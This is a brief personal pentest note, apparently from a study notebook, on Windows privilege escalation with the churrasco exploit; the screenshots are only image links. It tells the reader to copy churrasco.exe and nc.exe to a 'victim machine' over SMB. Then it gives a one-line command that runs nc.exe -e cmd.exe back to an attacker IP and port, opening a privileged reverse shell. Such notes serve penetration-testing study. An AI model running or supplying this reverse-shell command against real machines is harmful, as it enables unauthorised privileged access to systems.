transfer the churrasco.exe and nc.exe over to the victim machine using smb
- see file transfer notes
  
![image 429.png](../../../assets/Privilege%20Escalation%20with%20Churrasco/image%20429.png)
  
create a netcat listener, then run the following command
- ./churrasco.exe -d “C:\location_for\nc.exe -e cmd.exe <attacker_ip> <attacker_port>”
![image 7 51.png](/image%207%2051.png)
![image 8 48.png](/image%208%2048.png)